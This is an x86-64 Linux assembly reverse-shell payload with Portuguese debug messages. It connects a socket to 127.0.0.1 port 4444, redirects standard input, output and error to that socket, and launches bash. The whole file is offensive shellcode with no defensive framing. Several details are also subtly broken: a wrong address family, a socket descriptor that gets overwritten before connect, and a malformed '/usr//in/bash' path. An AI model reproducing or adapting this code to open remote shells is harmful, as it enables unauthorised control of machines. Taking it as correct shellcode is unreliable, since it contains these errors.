section .data
    msg_socket db "[+] socket() ok", 10
    msg_connect db "[+] connect() ok", 10
    msg_dup2 db "[+] dup2() ok", 10
    msg_execve db "[+] execve() ok", 10
    msg_fail db "[!] erro em syscall", 10

section .text
    global _start

_start:
    ; debug: socket
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_socket
    mov rdx, 17
    syscall

    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi            ; AF_INET
    mov     sil, 1              ; SOCK_STREAM
    xor     rdx, rdx            ; protocol = 0
    syscall

    mov     rdi, rax            ; sockfd

    ; struct sockaddr_in (AF_INET, port 4444, 127.0.0.1)
    sub     rsp, 16
    mov     word [rsp], 2              ; AF_INET
    mov     word [rsp+2], 0x5c11       ; PORT 4444 (big endian)
    mov     dword [rsp+4], 0x0100007f  ; 127.0.0.1
    xor     rax, rax
    mov     [rsp+8], rax               ; zero[8]

    ; debug: connect
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_connect
    mov rdx, 18
    syscall

    ; connect(sockfd, sockaddr*, 16)
    mov     rsi, rsp
    mov     al, 42
    mov     dl, 16
    syscall

    test    rax, rax
    js      fail

    mov     r12, rdi           ; salva sockfd para o loop
    xor     rbx, rbx           ; índice para dup2: 0, 1, 2

.loop:
    mov     rdi, r12           ; sockfd
    mov     rsi, rbx           ; target fd
    mov     rax, 33            ; syscall dup2
    syscall
    test    rax, rax
    js      fail

    inc     rbx
    cmp     rbx, 3
    jl      .loop

    ; debug: execve
    mov     rax, 1
    mov     rdi, 1
    mov     rsi, msg_execve
    mov     rdx, 17
    syscall

    ; execve("/usr/bin/bash", NULL, NULL)
    xor     rax, rax
    mov     rbx, 0x00687361622f6e69      ; "in/bash\0"
    mov     rcx, 0x2f2f7273752f          ; "/usr//"
    push    rbx
    push    rcx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59
    syscall

fail:
    mov     rax, 1
    mov     rdi, 1
    mov     rsi, msg_fail
    mov     rdx, 21
    syscall

    mov     rdi, 1
    mov     al, 60
    syscall
